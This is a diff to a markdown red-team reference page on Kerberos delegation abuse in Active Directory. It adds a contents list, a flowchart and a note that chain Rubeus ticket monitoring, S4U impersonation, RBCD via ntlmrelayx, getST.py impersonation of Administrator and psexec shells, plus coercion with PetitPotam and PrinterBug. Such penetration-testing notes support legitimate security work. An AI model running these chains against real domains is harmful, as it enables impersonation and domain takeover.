@@ -4,6 +4,33 @@
 
 Unconstrained, constrained, and resource-based constrained delegation (RBCD). Related: [kerberos-tickets](kerberos-tickets.md) · [dacl-attacks](dacl-attacks.md) · [ntlm-relay](ntlm-relay.md) · [enumeration](enumeration.md)
 
+## Contents
+- [Enumerate Delegation](#enumerate-delegation)
+- [Unconstrained Delegation (capture TGTs)](#unconstrained-delegation-capture-tgts)
+- [Constrained Delegation (S4U)](#constrained-delegation-s4u)
+- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
+- [SPN Jacking / tgssub](#spn-jacking--tgssub)
+
+## Delegation Abuse Chains
+
+```mermaid
+flowchart TD
+    subgraph "Unconstrained Delegation"
+    U1["Get-DomainComputer -Unconstrained\n(find the vulnerable host)"] --> U2["Rubeus.exe monitor /interval:5\n(wait for a privileged TGT to land)"]
+    U2 --> U3["Extract captured TGT → impersonate that user"]
+    end
+    subgraph "Constrained Delegation (S4U)"
+    C1["Get-DomainComputer -TrustedToAuth / findDelegation.py\n(find msDS-AllowedToDelegateTo)"] --> C2["S4U2self: forge a ticket to self as the target user"]
+    C2 --> C3["S4U2proxy: exchange it for a service ticket to the allowed SPN\nRubeus s4u /ptt or getST.py -impersonate"]
+    C3 --> C4["Access the service as the impersonated user"]
+    end
+    subgraph "Resource-Based Constrained Delegation"
+    R1["Compromise or create a computer account\n(write access to msDS-AllowedToActOnBehalfOfOtherIdentity)"] --> R2["ntlmrelayx.py --delegate-access\n(grant RBCD rights to a controlled account)"]
+    R2 --> R3["getST.py -spn <target_SPN> -impersonate Administrator"]
+    R3 --> R4["Use the forged ticket for a shell (psexec.py -k -no-pass)"]
+    end
+```
+
 ## Enumerate Delegation
 ```powershell
 .\SharpView.exe Get-DomainComputer -Unconstrained
@@ -30,6 +57,9 @@ Monitor for TGTs arriving every 5 seconds.
 Rubeus.exe monitor /interval:5 /nowrap
 ```
 Monitor Kerberos tickets (no line wrapping).
+
+> [!NOTE]
+> Unconstrained delegation only pays off once a privileged account (ideally a DC machine account, via a coercion like PetitPotam/PrinterBug — see [ntlm-relay](ntlm-relay.md)) authenticates to the compromised host while `Rubeus monitor` is running.
 
 ## Constrained Delegation (S4U)
 ```cmd
